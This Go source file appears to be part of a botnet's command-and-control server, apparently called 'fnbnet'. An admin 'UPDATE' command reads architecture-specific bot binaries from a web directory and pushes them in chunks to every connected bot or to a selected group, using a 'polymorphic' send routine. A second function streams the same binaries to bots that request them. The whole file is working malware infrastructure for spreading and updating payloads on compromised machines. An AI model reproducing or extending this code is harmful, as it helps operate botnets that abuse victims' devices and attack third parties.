package main

import (
	"encoding/binary"
	"fmt"
	"io"
	"net"
	"os"
	"path/filepath"
	"strings"
	"time"
)

const updateBinsDir = "/var/www/html/bins"

func handleUpdateCommand(admin *Admin, args string) {
	if args == "" {
		admin.conn.Write([]byte("Usage: UPDATE <id/all/arch> [arch]\r\n"))
		admin.conn.Write([]byte("  UPDATE all       - update all bots\r\n"))
		admin.conn.Write([]byte("  UPDATE x86       - update bots matching arch\r\n"))
		admin.conn.Write([]byte("  UPDATE all arm7   - send arm7 binary (default: auto from arch list)\r\n"))
		return
	}

	parts := strings.Fields(args)
	if len(parts) == 0 {
		return
	}

	target := parts[0]
	arch := "x86"
	if len(parts) >= 2 {
		arch = parts[1]
	}

	// read binary
	binPath := filepath.Join(updateBinsDir, "fnbnet."+arch)
	binData, err := os.ReadFile(binPath)
	if err != nil {
		admin.conn.Write([]byte(fmt.Sprintf("Binary not found: %s\r\n", binPath)))
		return
	}

	admin.conn.Write([]byte(fmt.Sprintf("Sending %s (%d bytes) to bots...\r\n", binPath, len(binData))))

	sentCount := 0
	for _, cli := range clientList.clients {
		if target != "all" && target != cli.source && target != fmt.Sprintf("%d", cli.uid) {
			continue
		}
		sendBinaryToBot(cli.conn, cli.ctx, binData)
		sentCount++
	}

	admin.conn.Write([]byte(fmt.Sprintf("Sent to %d bots\r\n", sentCount)))
}

func sendBinaryToBot(conn net.Conn, ctx *HandshakeCtx, data []byte) {
	totalSize := uint32(len(data))
	sent := uint32(0)
	chunkID := uint32(0)

	for sent < totalSize {
		chunkLen := UpdateChunkSize
		if int(sent)+chunkLen > len(data) {
			chunkLen = len(data) - int(sent)
		}

		// first chunk: [total_size:4][data...]
		// subsequent: [data...]
		var payload []byte
		if chunkID == 0 {
			payload = make([]byte, 4+chunkLen)
			binary.BigEndian.PutUint32(payload[0:4], totalSize)
			copy(payload[4:], data[sent:sent+uint32(chunkLen)])
		} else {
			payload = make([]byte, chunkLen)
			copy(payload, data[sent:sent+uint32(chunkLen)])
		}

		polymorphicSend(conn, ctx, PktTypeUpdate, 0, payload)
		sent += uint32(chunkLen)
		chunkID++
	}

	// send done
	polymorphicSend(conn, ctx, PktTypeUpdateDone, 0, nil)
	time.Sleep(10 * time.Millisecond)
}

// readBinaryRequest handles a bot's request for binary via grpc-style protocol
func handleBinaryRequest(conn net.Conn, arch string) {
	binPath := filepath.Join(updateBinsDir, "fnbnet."+arch)
	f, err := os.Open(binPath)
	if err != nil {
		return
	}
	defer f.Close()

	// stream binary in chunks
	buf := make([]byte, UpdateChunkSize)
	for {
		n, err := f.Read(buf)
		if n <= 0 {
			break
		}
		// simple chunk format: [size:2][data...]
		chunk := make([]byte, 2+n)
		binary.BigEndian.PutUint16(chunk[0:2], uint16(n))
		copy(chunk[2:], buf[:n])
		if _, err := conn.Write(chunk); err != nil {
			break
		}
		if err == io.EOF {
			break
		}
	}
	// send EOF marker
	eof := make([]byte, 2)
	binary.BigEndian.PutUint16(eof, 0xFFFF)
	conn.Write(eof)
}
